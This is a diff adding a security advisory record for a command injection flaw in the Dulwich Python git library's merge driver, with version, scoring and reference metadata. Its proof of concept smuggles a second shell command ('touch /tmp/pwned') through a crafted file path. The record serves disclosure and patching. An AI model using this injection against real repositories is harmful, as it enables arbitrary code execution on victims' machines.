@@ -1,0 +1,123 @@
+advisory_id: GHSA-9277-mp7x-85jf
+datasource_id: github_osv/GHSA-9277-mp7x-85jf
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9277-mp7x-85jf/GHSA-9277-mp7x-85jf.json
+aliases:
+  - CVE-2026-42563
+summary: |
+  Dulwich Vulnerable to Command Injection via Merge Driver Path
+  ## Summary
+
+  Dulwich's `ProcessMergeDriver` substitutes the file path (from the git tree, controllable by an attacker via a malicious branch) into the merge driver command via the `%P` placeholder and executes it with `subprocess.run(..., shell=True)`. An attacker who can cause a victim to merge an untrusted branch can achieve arbitrary command execution by crafting malicious file paths.
+
+  ## Description
+
+  - **Type:** Command Injection
+  - **Source:** `merge.py` line 195 — path from merge tree (from repository content when merging untrusted branch)
+  - **Sink:** `merge_drivers.py` lines 124–127 — `subprocess.run(cmd, shell=True)` where `cmd` includes path via `%P` placeholder
+  - **Impact:** Arbitrary code execution when merging from a malicious repository. Requires the user to have a merge driver configured that uses the `%P` placeholder.
+
+  ## Resources
+
+  - Repository: https://github.com/dulwich/dulwich
+  - Vulnerable file: `dulwich/merge_drivers.py` (lines 119–129)
+
+  ## Proof of Concept
+
+  ```python
+  from dulwich.attrs import GitAttributes, Pattern
+  from dulwich.config import ConfigDict
+  from dulwich.merge import merge_blobs
+  from dulwich.objects import Blob
+
+  # Merge driver with %P (path) - typical for custom merge tools
+  config = ConfigDict()
+  config.set((b"merge", b"injectable"), b"driver", b"echo %P > %A")
+
+  patterns = [(Pattern(b"*"), {b"merge": b"injectable"})]
+  gitattributes = GitAttributes(patterns)
+
+  base = Blob.from_string(b"base")
+  ours = Blob.from_string(b"ours")
+  theirs = Blob.from_string(b"theirs")
+
+  # Malicious path from attacker-controlled git tree: injects "touch /tmp/pwned"
+  malicious_path = b"x; touch /tmp/pwned #"
+
+  merge_blobs(base, ours, theirs, path=malicious_path,
+              gitattributes=gitattributes, config=config)
+  # => Executes: echo x; touch /tmp/pwned #
+  # => Shell runs: echo x, then touch /tmp/pwned
+  ```
+
+  ## Fix
+  [merge_drivers_shell_escape.patch](https://github.com/user-attachments/files/27016503/merge_drivers_shell_escape.patch)
+impacted_packages:
+  - purl: pkg:github/jelmer/dulwich
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/jelmer/dulwich
+        commit: e3331b3b3a122fc313460182f928f59723580b7b
+        patch_text:
+    introduced_in_commits: []
+  - purl: pkg:pypi/dulwich
+    affected_versions: vers:pypi/>=0.24.0|<1.2.5
+    fixed_versions: vers:pypi/1.2.5
+    affected_packages:
+      - pkg:pypi/dulwich@0.24.0
+      - pkg:pypi/dulwich@0.24.1
+      - pkg:pypi/dulwich@0.24.2
+      - pkg:pypi/dulwich@0.24.3
+      - pkg:pypi/dulwich@0.24.4
+      - pkg:pypi/dulwich@0.24.5
+      - pkg:pypi/dulwich@0.24.6
+      - pkg:pypi/dulwich@0.24.7
+      - pkg:pypi/dulwich@0.24.8
+      - pkg:pypi/dulwich@0.24.9
+      - pkg:pypi/dulwich@0.24.10
+      - pkg:pypi/dulwich@0.25.0
+      - pkg:pypi/dulwich@0.25.1
+      - pkg:pypi/dulwich@0.25.2
+      - pkg:pypi/dulwich@1.0.0
+      - pkg:pypi/dulwich@1.1.0
+      - pkg:pypi/dulwich@1.2.0
+      - pkg:pypi/dulwich@1.2.1
+      - pkg:pypi/dulwich@1.2.2
+      - pkg:pypi/dulwich@1.2.3
+      - pkg:pypi/dulwich@1.2.4
+    fixed_packages:
+      - pkg:pypi/dulwich@1.2.5
+    fixed_in_commits: []
+    introduced_in_commits: []
+severities:
+  - score: '7.7'
+    scoring_system: cvssv4
+    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-9277-mp7x-85jf/GHSA-9277-mp7x-85jf.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-78
+references:
+  - url: https://github.com/jelmer/dulwich
+    reference_type:
+    reference_id:
+  - url: https://github.com/jelmer/dulwich/commit/e3331b3b3a122fc313460182f928f59723580b7b
+    reference_type:
+    reference_id:
+  - url: https://github.com/jelmer/dulwich/releases/tag/dulwich-1.2.5
+    reference_type:
+    reference_id:
+  - url: https://github.com/jelmer/dulwich/security/advisories/GHSA-9277-mp7x-85jf
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-42563
+    reference_type:
+    reference_id: CVE-2026-42563
+exploits: []
